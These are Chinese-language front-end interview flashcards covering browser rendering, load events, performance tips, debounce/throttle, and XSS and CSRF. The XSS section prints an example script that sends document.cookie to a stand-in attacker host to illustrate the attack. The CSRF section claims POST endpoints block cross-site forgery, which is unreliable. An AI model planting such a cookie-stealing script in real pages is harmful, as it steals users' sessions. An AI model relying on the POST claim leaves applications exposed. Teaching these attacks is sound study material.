# Front-End-Interview::08-运行环境

## JavaScript 的运行环境有哪些？

<!-- notecardId: 1704210577838 -->

📢 参考答案：

JavaScript 的运行环境大致可以分为以下几种：

1. **客户端浏览器**

   - 如 Chrome、Firefox、Safari、Edge 等各大浏览器，包括 PC 端和移动端

2. **服务端 Node.js**

3. **特殊运行环境**

   - 如微信小程序、支付宝小程序等

## 从输入 url 到渲染出页面的整个过程？

<!-- notecardId: 1704210577844 -->

🔍 所考察的知识点：页面加载

📢 参考答案：

从输入 url 到渲染出页面分为两个过程：**加载资源**和**渲染页面**

### 加载资源

1. 客户端**将域名解析成 IP 地址**
2. 使用 IP 地址与服务器端**建立 TCP 连接**
3. **发起 HTTP 请求**
4. 服务器端**处理**请求，**生成**响应，并**返回**给客户端

### 渲染页面

5. 客户端解析 HTML 代码，**生成 DOM 树**
6. 解析 CSS 代码或 HTML 中的内联样式，**生成 CSSOM**
7. 将 DOM 树和 CSSOM 树**合并生成 Render 树**
8. 根据 Render 树渲染页面
9. 若解析 HTML 时，遇到 `<script>` 标签，则会**停止所有解析和渲染树的构建**，先加载并执行 js 代码，完成后再继续
10. 重复上述过程，直到页面渲染完成
    > 注：
    >
    > 1. 解析 HTML 是**从上到下，一行一行执行**的
    > 2. 浏览器采用**渐进式渲染**，所以生成渲染树的时机**不是等待 HTML 和 CSS 全部解析完成，而是逐步进行**，即每解析一个 HTML 元素，都会生成最新的 DOM 树、最新的 CSSOM（若有内联样式或者遇到 `<link>` 标签）以及合并为最新的渲染树

## window.onload 和 DOMContentLoaded 的区别？

<!-- notecardId: 1704210577848 -->

📢 参考答案：

- window.onload 要**等待页面的所有资源加载完**才能触发事件，包括图片、视频等
- 而 DOMContentLoaded **只要 DOM 渲染完成**即可触发事件，此时图片、视频等可能尚未加载完

## 为何建议把 css 放在 head 中？

<!-- notecardId: 1704210577854 -->

🔍 所考察的知识点：性能优化

📢 参考答案：

由于浏览器在解析 HTML 文档时，是从上到下、一行一行执行的，将 CSS 放在 `<head>` 中可以确保页面在渲染内容之前，样式表已被加载和解析完成，这样渲染时，内容就应用了所有的样式，从而**防止不必要的重新渲染，避免无样式内容闪烁（FOUC）的问题，提高页面渲染的速度**

> 注：无样式内容的闪烁（FOUC）指的是在加载样式表之前先呈现出未经样式修饰的内容，然后加载样式表后再突然应用样式导致内容闪烁的情况

## 为何建议把 js 放在 body 最后？

<!-- notecardId: 1704210577858 -->

🔍 所考察的知识点：性能优化

📢 参考答案：

由于浏览器在解析 HTML 文档的过程中遇到 js 代码，会暂停 HTML 的解析，直到 js 代码执行完成。若将 js 代码**放在页面头部或中间**，则一方面，**会造成页面渲染不连贯，无法让用户尽早看到页面的所有内容**，另一方面，执行 js 代码时，由于某些元素还没被解析，**无法访问完整的 DOM 树**，从而**可能导致操作 DOM 失败**

## 前端常见的性能优化方案？

<!-- notecardId: 1704210577863 -->

🔍 所考察的知识点：性能优化

📢 参考答案：

前端性能优化可以从以下几个方面入手：**让加载更快、让渲染更快、让体验更好**

### 让加载更快

1. 减少资源体积
   - **压缩代码**
     - 例如在自动化构建工具当中，使用**生产模式**来打包项目代码
   - **压缩图片**
2. 减少 HTTP 请求次数
   - **合并代码**
     - 例如将多个 js 文件合并为一个文件，这样只需发起一次 HTTP 请求
   - **合并图片**
     - 例如使用**雪碧图**（CSS Sprites）技术，将网页中的**很多小背景图像整合到一张大图**中，这样浏览器只需发起一次 HTTP 请求
   - **使用 SSR 服务端渲染**
     - 传统的客户端渲染是先请求获取 HTML 页面，然后再请求获取页面当中的动态数据，这个过程会进行好几次请求，而**服务器端渲染是直接生成完整的 HTML 页面（包括网页和相关动态数据）返回给客户端**，这样客户端只需要请求一次即可获取所有内容
   - **使用缓存**
     - 例如打包生成的**静态资源文件名使用 hash 后缀**，该 hash 根据文件内容计算而来，**文件内容不变，则 hash 不变，url 也不变**，这样客户端请求时，会自动触发 http 缓存机制，返回 304
3. 使用更快的网络
   - **使用 CDN**
     - CDN 全称为 Content Delivery Network（内容分发网络），可以根据用户所在的区域**请求离他们最近的服务器**获取网站资源，从而减少资源加载时间，提高用户体验

### 让渲染更快

1. **CSS 放在 head 里面，JS 放在 body 最下面**
   - CSS 放在 head 里面避免不必要的重新渲染，JS 放在 body 最下面避免阻塞解析和渲染
2. **监听 DOMContentLoaded 事件**，而不是 onload 事件
   - 这样可以尽早开始执行 js，不用等待所有资源加载完毕
3. **懒加载**
   - 对于图片和视频等大型媒体资源，可以使用懒加载，只有当用户滚动到它们的位置时才加载
4. **对 DOM 查询结果进行缓存**
   - 重复 DOM 查询会增加性能开销，使得渲染速度变慢
5. **将频繁的 DOM 操作合并到一起，再插入结构**
   - DOM 操作是相对慢的操作，频繁的 DOM 操作会增加页面的重排（Reflow）和重绘（Repaint）次数，因此，减少 DOM 操作可以提高渲染速度

### 让体验更好

1. **使用防抖（debounce）和节流（throttle）**
   - 用于**控制事件的触发频率**，优化用户体验

## 请介绍一下防抖（debounce）和节流（throttle）

<!-- notecardId: 1704210577866 -->

🔍 所考察的知识点：性能优化

📢 参考答案：

在前端开发中，防抖（debounce）和节流（throttle）是两种常见的技术，用于**控制事件的触发频率**，以优化性能

### 防抖（Debounce）

#### 防抖定义

- 指的是当事件被频繁触发时，会**重新计时**，保证**只有最后一次触发生效**，前面 n 次触发会被忽略，防抖示意图如下：
  ![](../Media/%E9%98%B2%E6%8A%96%E7%A4%BA%E6%84%8F%E5%9B%BE.png)

#### 防抖应用场景

1. **搜索框实时搜索提示**
   - 用户在输入框中输入文字，只有当用户停止输入一段时间后才开始请求，从而减少请求频率
2. **窗口大小调整事件**（resize）
   - 只有当用户停止调整窗口大小一段时间后才重新计算布局，减少计算次数。

### 节流（Throttle）

#### 节流定义

- 指的是当事件被频繁触发时，**不跟随触发频率**，保持**自身固有频率触发**，节流示意图如下：
  ![](../Media/%E8%8A%82%E6%B5%81%E7%A4%BA%E6%84%8F%E5%9B%BE.png)

#### 节流应用场景

1. 懒加载中监听**滚动事件**（scroll）计算滚动条的位置
   - 用户滚动页面时，在固定时间内只触发一次，避免每次滚动都触发滚动事件，从而节约 CPU 资源
2. 元素跟随鼠标中监听**鼠标移动事件**（mousemove）设置元素位置
   - 跟踪鼠标位置，但在固定时间内只触发一次，避免每次移动鼠标都触发鼠标移动事件，从而节约 CPU 资源

## Web 前端常见的攻击方式有哪些？

<!-- notecardId: 1704297403250 -->

🔍 所考察的知识点：安全

📢 参考答案：

前端中，常见的攻击方式有两种：**XSS（跨站脚本攻击）**、**CSRF（跨站请求伪造）**

### XSS（跨站脚本攻击）

#### 定义

- 指的是攻击者通过**在目标网站上注入恶意脚本**，当其他用户浏览该网站时，注入的脚本会被执行，从而可以**获取用户的敏感信息**，如 cookies、session 等

#### 实际场景

- 例如我在一个博客网站发表了一篇博客，其中嵌入一段恶意的脚本，代码的内容是获取 cookie，并发送到我的服务器（服务端配合跨域即可实现），这样有人查看这篇博客，我就可以轻松收割访问者的 cookie，脚本内容如下：

  ```html
  <script>
    // 恶意脚本，用于盗取用户信息
    axios.post('https://attacker.com/steal', { data: document.cookie });
  </script>
  ```

#### 预防方法

1. **转义特殊字符**
   - 例如，使用 `&lt;` 代替 `<`，使用 `&gt;` 代替 `>`，这样 **`<script>` 就会被转义为 `&lt;script&gt;`，以纯文本形式显示，而不会作为脚本执行**

### CSRF（跨站请求伪造）

#### 定义

- 指的是攻击者**诱导用户点击链接**，利用用户**已经认证的身份**去进行恶意请求

#### 实际场景

- 例如用户 **登录**了他的银行网站，并在**不退出登录**的情况下，**访问恶意网站**，该网站诱导用户去点击一个隐藏发起转账请求的链接或按钮，当用户点击它时，就会向银行网站发送一个转账请求，由于用户处于登录状态，所以这个请求看起来就像是用户自己发送的，银行服务器可能就会执行这个转账操作

#### 预防方法

1. **重要操作使用 POST 接口**
   - 因为 POST 接口做跨域，要服务端的支持，这样恶意网站在请求非同源地址时，就无法成功
2. **增加验证**
   - 如支付密码、短信验证码、指纹等验证

## document load 和 ready 的区别?

<!-- notecardId: 1704472304064 -->

📢 参考答案：

这个问题是「window.onload 和 DOMContentLoaded 的区别？」的另一种问法而已
其中 **DOMContentLoaded 事件也称为 ready 事件**

- window.onload 要**等待页面的所有资源加载完**才能触发事件，包括图片、视频等
- 而 DOMContentLoaded **只要 DOM 渲染完成**即可触发事件，此时图片、视频等可能尚未加载完
